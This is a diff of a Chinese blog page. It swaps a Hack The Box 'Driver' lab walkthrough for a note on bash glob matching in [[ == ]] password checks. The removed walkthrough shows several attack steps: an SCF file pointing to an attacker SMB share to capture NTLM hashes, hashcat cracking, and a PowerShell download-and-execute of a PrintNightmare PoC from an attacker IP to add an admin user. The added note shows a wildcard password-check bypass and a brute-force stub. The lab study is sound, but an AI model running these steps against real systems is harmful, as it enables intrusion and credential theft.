@@ -9,7 +9,7 @@
     
     <title>
         
-            htb driver复盘 |
+            sh脚本中==判断的几个情况 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        htb driver复盘
+                        sh脚本中==判断的几个情况
                     </div>
                 
 
@@ -217,12 +217,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-04-10</span>
+                <span class="datetime">2024-04-23</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Apr 10 2024 10:17:09 GMT+0800">2024-04-10</span>
+                <span class="datetime" data-updated="Tue Apr 23 2024 22:01:36 GMT+0800">2024-04-23</span>
             </span>
         
 
@@ -232,13 +232,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/htb/">htb</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/windows/">windows</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li>
                         
                     
                 </ul>
@@ -266,63 +260,39 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <p>📝📝📝</p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
-<p>👍：<a class="link"   target="_blank" rel="noopener" href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
-<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
-<p>难度：easy</p>
-<p>ip：10.10.11.106</p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>
+                    <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
+<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
-<p>开的端口不少，有445端口（SMB），5985证明可以用evil-winrm登陆</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >
+<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
+<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
+<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
+<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
+<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
-<p>枚举和smbclient都找不到有效信息，而且这个windows版本是10，用不了永恒之蓝（知识点摄入了！）</p>
-<p>看到80端口开放，有个登陆口，猜测是弱口令’admin:admin’，成功了，进入发现是个打印系统</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >
+<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
+<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
+<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
 
-<p>扫目录扫不到什么东西，但是很容易找到一个文件上传点，结合前面开的SMB，尝试<strong>通过NTLM捕获进行SMB攻击</strong></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://m.freebuf.com/articles/web/318970.html" >何为通过NTLM捕获进行SMB攻击<i class="fas fa-external-link-alt"></i></a> 这篇文章写的很清楚👍，接下来跟着利用就行</p>
-<p>1.先写一个scf文件（<em>SCF文件</em>是“WINDOWS资源管理器命令”文件，它也是一种可执行文件）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>
+<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
+<p>这个东西有点抽象，群主当时给了例子</p>
+<p>我自己复现了一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
+<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
+<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
+<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
+<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>
 
-<p>2.上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>
-
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >
-
-<p>然后上传scf文件，然后就抓到一串hash</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
-<p>hashcat爆破，爆出密码为liltony</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
-<p>拿着账号密码登陆tony账户，成功拿到第一个flag</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-process # 查看进程</span><br></pre></td></tr></table></figure>
-
-<p>找到一个spoolsv，网上能找到公开漏洞</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
-<p>下载poc放到网站目录下，让靶机下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>添加一个新的用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
-<p>查看管理员组，确认权限没问题</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
-<p>再用evil-winRM登陆，这个时候就是管理员权限了，提权成功</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
-<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在历史命令文件中找到RICOH PCL6 UniversalDriver V4.23服务，msf有相关poc可以用</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
-<p>但是跟着wp一直利用失败，这里就留一个未解决的事项吧。。。</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：80端口通过弱口令–&gt;找到文件上传点–&gt;结合SMB服务进行scf攻击抓到用户密码hash–&gt;发现存在公开漏洞的服务spoolsv&#x2F;ricoh–&gt;l利用公开poc提权</p>
-<p>涉及：smb端口scf攻击，学到了！</p>
-<p>也是尝试了用msf拿到shell，方法二提权失败有待研究，目前花太多时间在这上面，以后再好好研究吧</p>
+<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
+<p>肯定不止这个用法，后续待更新</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
+<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
 
                 </div>
                 
@@ -333,15 +303,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98/">复盘</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/htb/">htb</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/windows/">windows</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
                                     </li>
                                 
                             </ul>
@@ -357,31 +319,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/"
-                                   title="sh脚本中==判断的几个情况"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">sh脚本中==判断的几个情况</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/"
-                                   title="htb return复盘"
+                                   href="/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/"
+                                   title="htb driver复盘"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb return复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">htb driver复盘</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -409,7 +355,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E6%AD%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">&#x3D;&#x3D;绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B51"><span class="nav-number">2.2.</span> <span class="nav-text">*没法用的情况1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B52"><span class="nav-number">2.3.</span> <span class="nav-text">*没法用的情况2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">*绕过的应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
@@ -572,7 +518,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E6%AD%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">&#x3D;&#x3D;绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B51"><span class="nav-number">2.2.</span> <span class="nav-text">*没法用的情况1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B52"><span class="nav-number">2.3.</span> <span class="nav-text">*没法用的情况2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">*绕过的应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
